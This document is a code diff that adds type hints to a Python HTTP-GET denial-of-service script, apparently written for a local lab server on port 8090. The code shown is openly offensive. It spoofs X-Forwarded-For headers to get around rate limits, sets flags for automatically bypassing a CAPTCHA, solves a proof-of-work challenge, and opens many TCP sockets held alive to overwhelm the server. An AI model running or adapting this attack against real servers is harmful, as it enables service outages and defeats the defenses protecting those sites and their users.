@@ -1,27 +1,27 @@
 import random, time, re, socket, threading, requests, hashlib, urllib.parse
 
 #=====================================Defenses Flags======================================#
-ATTACK_RATE_LIMIT = True #spoof X-Forwarded-For IP for bypassing rate limit
-ATTACK_CAPTCHA = True #bypass CAPTCHA and submit it automatically
-ATTACK_POW = True #solve Proof-of-Work challenge
+ATTACK_RATE_LIMIT: bool = True #spoof X-Forwarded-For IP for bypassing rate limit
+ATTACK_CAPTCHA: bool = True #bypass CAPTCHA and submit it automatically
+ATTACK_POW: bool = True #solve Proof-of-Work challenge
 #=========================================================================================#
 
 #===================================Default Parameters====================================#
-TARGET_IP = '127.0.0.1' #represents target IP
-TARGET_PORT = 8090 #represents target port
-PROTECTED_URL = f'http://{TARGET_IP}:{TARGET_PORT}/protected' #represents target server "/protected" path
-SUBMIT_URL = f'http://{TARGET_IP}:{TARGET_PORT}/' #represents target server "/" path
-MAX_CONNECTIONS = 100 #represents number of TCP connection sockets for each thread
-SPAWN_DELAY = 0.005 #represents delay between spawning each worker
-HEADER_DELAY = 10 #represents delay between sending each wave of headers
-REQUEST_TIMEOUT = 10 #represents timeout for HTTP requests
-SHUTDOWN_EVENT = threading.Event() #represents shutdown event for letting attack threads know when to exit
+TARGET_IP: str = '127.0.0.1' #represents target IP
+TARGET_PORT: int = 8090 #represents target port
+PROTECTED_URL: str = f'http://{TARGET_IP}:{TARGET_PORT}/protected' #represents target server "/protected" path
+SUBMIT_URL: str = f'http://{TARGET_IP}:{TARGET_PORT}/' #represents target server "/" path
+MAX_CONNECTIONS: int = 100 #represents number of TCP connection sockets for each thread
+SPAWN_DELAY: float = 0.005 #represents delay between spawning each worker
+HEADER_DELAY: int = 10 #represents delay between sending each wave of headers
+REQUEST_TIMEOUT: int = 10 #represents timeout for HTTP requests
+SHUTDOWN_EVENT: threading.Event = threading.Event() #represents shutdown event for letting attack threads know when to exit
 #=========================================================================================#
 
 #===================================Header Parameters=====================================#
-USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', 'Mozilla/5.0 (X11; Linux x86_64)']
-HEADER_NAMES = ['X-a', 'X-b', 'X-c', 'X-d', 'X-e']
-HEADER_VALUES = ['t', 'u', 'v', 'w', 'x']
+USER_AGENTS: list = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', 'Mozilla/5.0 (X11; Linux x86_64)']
+HEADER_NAMES: list = ['X-a', 'X-b', 'X-c', 'X-d', 'X-e']
+HEADER_VALUES: list = ['t', 'u', 'v', 'w', 'x']
 #=========================================================================================#
 
 
@@ -29,14 +29,14 @@ HEADER_VALUES = ['t', 'u', 'v', 'w', 'x']
 class DoS_HTTP_GET():
     # method for getting "X-Forwarded-For" headers with spoofed IP address for bypassing rate limit
     @staticmethod
-    def get_spoofed_headers():
+    def get_spoofed_headers() -> dict:
         # return X-Forwarded headers with spoofed IP address for bypassing rate limit if flag set, else return our real IP address
         return {'X-Forwarded-For': '.'.join(str(random.randint(1,254)) for _ in range(4)) if ATTACK_RATE_LIMIT else socket.gethostbyname(socket.gethostname())}
 
 
     # method for getting the challenged from server html, including captcha and PoW nonce and target
     @staticmethod
-    def fetch_challenges(headers):
+    def fetch_challenges(headers: dict) -> tuple:
         # get response from protected page of server that includes our challenge parameters
         protected_response = requests.get(PROTECTED_URL, headers=headers, timeout=REQUEST_TIMEOUT)
         text = protected_response.text #get the text from response
@@ -57,7 +57,7 @@ class DoS_HTTP_GET():
 
     # method for solving the PoW challenge and finding valid counter (Hard task)
     @staticmethod
-    def solve_pow(nonce, target):
+    def solve_pow(nonce: bytes, target: int) -> bytes:
         counter = 0 #initilaize counter to zero
 
         # find valid counter such that sha256(nonce + counter) <= target
@@ -79,7 +79,7 @@ class DoS_HTTP_GET():
 
     # method for performing HTTP-GET DoS attack on HTTP server and keeping TCP sockets alive for overwhelming server
     @staticmethod
-    def perform_DoS():
+    def perform_DoS() -> None:
         socket_list = [] #represents socket list with valid sockets we want to keep alive
 
         # created TCP socket connections to server for HTTP-GET DoS attack
